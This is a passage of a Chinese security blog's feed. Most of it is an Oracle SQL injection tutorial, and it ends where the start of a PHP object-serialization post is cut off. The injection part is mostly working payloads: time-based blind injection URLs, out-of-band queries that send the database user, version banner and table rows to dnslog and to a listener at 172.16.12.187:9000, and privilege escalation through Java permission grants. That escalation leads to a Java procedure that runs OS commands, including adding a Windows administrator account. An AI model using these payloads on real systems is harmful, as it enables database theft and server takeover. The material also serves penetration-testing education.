class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)),<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">115</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">....继续跑 下一个表</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>_</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> 条件 <span class="keyword">THEN</span> 执行语句 <span class="keyword">END</span> xxx dbms_pipe.receive_message((), <span class="number">5</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> decode(substr((<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;O&#x27;</span>, dbms_pipe.receive_message(<span class="string">&#x27;ICQ&#x27;</span>, <span class="number">5</span>),<span class="number">0</span>) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">1</span><span class="comment">--截取数据库版本第一个字符为O就延时5s</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> decode(length(<span class="keyword">user</span>),<span class="number">4</span>,dbms_pipe.receive_message(<span class="string">&#x27;ICQ&#x27;</span>, <span class="number">5</span>),<span class="number">0</span>) <span class="keyword">from</span> dual) <span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br><span class="line">用户名长度为<span class="number">4</span> 就延时<span class="number">5</span>s</span><br><span class="line"># 使用延时函数</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> dbms_pipe.receive_message(<span class="string">&#x27;123&#x27;</span>,<span class="number">10</span>)</span><br><span class="line"># 使用条件语句</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> 条件 <span class="keyword">THEN</span> 执行语句 <span class="keyword">END</span> xxx</span><br><span class="line">#组成.条件成立执行延时<span class="number">10</span>S,并返回<span class="literal">true</span>,否返回<span class="literal">false</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">THEN</span> dbms_pipe.receive_message(<span class="string">&#x27;123&#x27;</span>,<span class="number">10</span>) <span class="keyword">END</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"># 注入语句:</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">when</span> (ascii(substr((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)),<span class="number">2</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">1</span> <span class="keyword">THEN</span> dbms_pipe.receive_message(<span class="string">&#x27;123&#x27;</span>,<span class="number">5</span>) <span class="keyword">END</span> <span class="number">123</span> <span class="keyword">from</span> dual</span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (ascii(substr((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)),<span class="number">2</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">100</span> <span class="keyword">THEN</span> DBMS_PIPE.RECEIVE_MESSAGE(<span class="number">123</span>, <span class="number">5</span>) <span class="keyword">ELSE</span> <span class="number">1</span> <span class="keyword">END</span>)<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="带外查询"><a href="#带外查询" class="headerlink" title="带外查询"></a>带外查询</h3><p>所以使用OOB需要有发起网络请求的权限</p><ul><li><strong>utl_http.request</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name<span class="operator">=</span><span class="string">&#x27;UTL_HTTP&#x27;</span>)<span class="operator">&gt;</span><span class="number">1</span><span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">null</span>,<span class="number">3</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name<span class="operator">=</span><span class="string">&#x27;UTL_HTTP&#x27;</span>) <span class="keyword">from</span> dual<span class="comment">-- #判断utl_http是否可用</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">utl_http.request向外网主机发送http请求，需要出外网http</span><br><span class="line"><span class="keyword">select</span> utl_http.request(<span class="string">&#x27;dnslog&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><h2 id="Oracle-外带"><a href="#Oracle-外带" class="headerlink" title="Oracle 外带"></a>Oracle 外带</h2><p>需要网络访问权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name<span class="operator">=</span><span class="string">&#x27;UTL_HTTP&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://oracle.zcv76n.dnslog.cn?data=xxx&#x27;</span>) <span class="keyword">FROM</span> DUAL  <span class="operator">/</span><span class="operator">/</span>需要网络访问权限</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS(<span class="string">&#x27;oracle.zcv76n.dnslog.cn&#x27;</span>) <span class="keyword">FROM</span> DUAL </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> SYS.DBMS_LDAP.INIT(<span class="string">&#x27;oracle.zcv76n.dnslog.cn&#x27;</span>, <span class="number">9000</span>) <span class="keyword">FROM</span> DUAL </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://oracle.zcv76n.dnslog.cn?data=xxx&#x27;</span>) <span class="keyword">FROM</span> DUAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>)) <span class="keyword">FROM</span> DUAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> RAWTOHEX(banner) <span class="keyword">FROM</span> v$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>)) <span class="keyword">FROM</span> DUAL</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST((<span class="keyword">SELECT</span> <span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>OWNER <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)) <span class="keyword">FROM</span> DUAL</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> UTL_HTTP.REQUEST((<span class="keyword">SELECT</span> <span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>DATA <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> RAWTOHEX(DATA), ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> id<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>name<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>age<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>sex <span class="keyword">AS</span> DATA <span class="keyword">FROM</span>  TEST.DEMO)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)) <span class="keyword">FROM</span> DUAL) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> </span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> UTL_HTTP.REQUEST((<span class="keyword">SELECT</span> <span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>DATA <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> RAWTOHEX(DATA), ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> id<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>name<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>age<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>sex <span class="keyword">AS</span> DATA <span class="keyword">FROM</span>  TEST.DEMO)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS(SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;.oracle.zcv76n.dnslog.cn&#x27;</span>) <span class="keyword">FROM</span> DUAL </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS((<span class="keyword">SELECT</span> RAWTOHEX(banner)<span class="operator">||</span><span class="string">&#x27;.oracle.zcv76n.dnslog.cn&#x27;</span> <span class="keyword">FROM</span> v$version)) <span class="keyword">FROM</span> DUAL</span><br></pre></td></tr></table></figure><p><strong>开启ACL网络访问控制方法：</strong></p><p><strong>首先连接到超级用户</strong></p><ul><li><strong>创建 ACL</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line">dbms_network_acl_admin.create_acl (</span><br><span class="line">acl <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;UTL_INADDR.xml&#x27;</span>,</span><br><span class="line">description <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;utl_inaddr&#x27;</span>,</span><br><span class="line">principal <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;TEST&#x27;</span>,   <span class="comment">--此为将来要进行操作的用户</span></span><br><span class="line">is_grant <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">TRUE</span>,</span><br><span class="line">privilege <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;resolve&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>增加权限</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line">dbms_network_acl_admin.add_privilege (</span><br><span class="line">acl <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;UTL_INADDR.xml&#x27;</span>,</span><br><span class="line">principal <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;TEST&#x27;</span>,</span><br><span class="line">is_grant <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">TRUE</span>,</span><br><span class="line">privilege <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;connect&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>授予用户权限</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line">dbms_network_acl_admin.assign_acl(</span><br><span class="line">acl <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;UTL_INADDR.xml&#x27;</span>,</span><br><span class="line">host <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><p><strong>登录到TEST用户,即可以使用网络外带</strong></p><h2 id="Oracle-提权"><a href="#Oracle-提权" class="headerlink" title="Oracle 提权"></a>Oracle 提权</h2><p>SELECT * from session_privs;–查看权限 需要JAVA权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">    <span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>, <span class="string">&#x27;ZTZ&#x27;</span>, <span class="string">&#x27;SYS&#x27;</span>, <span class="string">&#x27;java.io.FilePermission&#x27;</span>, <span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>, <span class="string">&#x27;execute&#x27;</span>, <span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line">    <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">OPEN</span> C1;</span><br><span class="line">    <span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line">    <span class="keyword">CLOSE</span> C1;</span><br><span class="line">    DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">  <span class="keyword">END</span>; <span class="comment">--获取JAVA权限</span></span><br></pre></td></tr></table></figure><p>​    </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line"><span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>, <span class="keyword">USER</span>(), <span class="string">&#x27;SYS&#x27;</span>, <span class="string">&#x27;java.lang.RuntimePermission&#x27;</span>,<span class="string">&#x27;writeFileDescriptor&#x27;</span>, <span class="string">&#x27;NULL&#x27;</span>, <span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">OPEN</span> C1;</span><br><span class="line"><span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line"><span class="keyword">CLOSE</span> C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">   POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">   <span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>, <span class="keyword">USER</span>(), <span class="string">&#x27;SYS&#x27;</span>, <span class="string">&#x27;java.lang.RuntimePermission&#x27;</span>,<span class="string">&#x27;readFileDescriptor&#x27;</span>, <span class="string">&#x27;NULL&#x27;</span>, <span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line">   <span class="keyword">BEGIN</span></span><br><span class="line">   <span class="keyword">OPEN</span> C1;</span><br><span class="line">   <span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line">   <span class="keyword">CLOSE</span> C1;</span><br><span class="line">   DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">   <span class="keyword">END</span>; <span class="comment">--获得java.lang.RuntimePermission权限</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">and</span> resolve java source named JAVACMD <span class="keyword">as</span></span><br><span class="line">import java.lang.<span class="operator">*</span>;</span><br><span class="line">import java.io.<span class="operator">*</span>;</span><br><span class="line">public class JAVACMD</span><br><span class="line">&#123;</span><br><span class="line">   public <span class="keyword">static</span> void execmd(String command) throws IOException</span><br><span class="line">   &#123;</span><br><span class="line">           Runtime.getRuntime().<span class="keyword">exec</span>(command);</span><br><span class="line">   &#125;</span><br><span class="line">      &#125;<span class="comment">--创建一个java class然后用procedure包装它进行调用</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">procedure</span> MYJAVACMD(command <span class="keyword">in</span> <span class="type">varchar</span>) <span class="keyword">as</span> <span class="keyword">language</span> java</span><br><span class="line">    name <span class="string">&#x27;JAVACMD.execmd(java.lang.String)&#x27;</span>;<span class="comment">--创建调用的包</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXEC</span> MYJAVACMD(<span class="string">&#x27;net user ka 123.com, /add&#x27;</span>); </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>​     </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">AND</span> RESOLVE Java SOURCE NAMED &quot;JAVACMD&quot; <span class="keyword">AS</span></span><br><span class="line"></span><br><span class="line">import java.lang.<span class="operator">*</span>;</span><br><span class="line"></span><br><span class="line">import java.io.<span class="operator">*</span>;public class JAVACMD</span><br><span class="line"></span><br><span class="line">&#123;public <span class="keyword">static</span> void execCommand (String command) throws IOException</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().<span class="keyword">exec</span>(command);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;<span class="operator">/</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">PROCEDURE</span> JAVACMDPROC (p_command <span class="keyword">IN</span> VARCHAR2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">LANGUAGE</span> JAVA</span><br><span class="line"></span><br><span class="line">NAME <span class="string">&#x27;JAVACMD.execCommand (java.lang.String)&#x27;</span>;<span class="operator">/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> javacmdproc(<span class="string">&#x27;cmd.exe /c net user qingxin qingxin /add&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> javacmdproc(<span class="string">&#x27;cmd.exe /c net localgroup administrators qingxin /add&#x27;</span>);</span><br></pre></td></tr></table></figure><p>​     </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">select</span> SYS.KUPP$PROC.CREATE_MASTER_PROCESS(<span class="string">&#x27;DBMS_SCHEDULER.create_program(&#x27;&#x27;myprog4&#x27;&#x27;,&#x27;&#x27;EXEC UTABLE&#x27;&#x27;,&#x27;&#x27;c:\WINDOWS\system32\cmd.exe /c dir &gt;&gt; c:\my4.txt&#x27;&#x27;,0,TRUE);&#x27;</span>) <span class="keyword">from</span> dual</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">select</span> SYS.KUPP$PROC.CREATE_MASTER_PROCESS(<span class="string">&#x27;DBMS_SCHEDULER.create_job(job_name =&gt; &#x27;&#x27;myjob4&#x27;&#x27;,program_name =&gt; &#x27;&#x27;myprog4&#x27;&#x27;,start_date =&gt; NULL,repeat_interval =&gt; NULL,end_date =&gt; NULL,enabled =&gt; TRUE,auto_drop =&gt; TRUE);&#x27;</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure><p>​<br>​     </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Oracle的基础操作&quot;&gt;&lt;a href=&quot;#Oracle的基础操作&quot; class=&quot;headerlink&quot; title=&quot;Oracle的基础操作&quot;&gt;&lt;/a&gt;Oracle的基础操作&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;基础语句&lt;/strong&gt;&lt;/p&gt;
&lt;figure </summary>
      
    
    
    
    
    <category term="sql注入" scheme="https://bstark.me/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://bstark.me/posts/4/"/>
    <id>https://bstark.me/posts/4/</id>
    <published>2022-01-23T14:22:33.000Z</published>
    <updated>2022-04-01T06:46:54.702Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="0x1-前置基础知识"><a href="#0x1-前置基础知识" class="headerlink" title="0x1.前置基础知识"></a>0x1.前置基础知识</h2><h3 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h3><p>类：定义属性（可以理解为局部变量）和方法（可以理解为函数）的结构</p><p>对象：类的实例化</p><blockquote><p>一个具体的例子：比如一个汽车店，汽车油耗，重量，座位多少，这些称为属性，汽车能开车，能充电，这些称为方法。那对象就是类的实例化，比如奥迪a6就是汽车类里的具体化汽车对象</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//栗子1-1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span></span>&#123;</span><br><span class="line">   <span class="comment">//定义类属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;zhangsan&#x27;</span>;</span><br><span class="line">   <span class="comment">//定义类方法</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">talk</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name.<span class="string">&quot; is talking with lisi\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$zhangsan</span> = <span class="keyword">new</span> people(); <span class="comment">//实例化对象</span></span><br><span class="line"><span class="variable">$zhangsan</span>-&gt;talk();</span><br><span class="line"><span 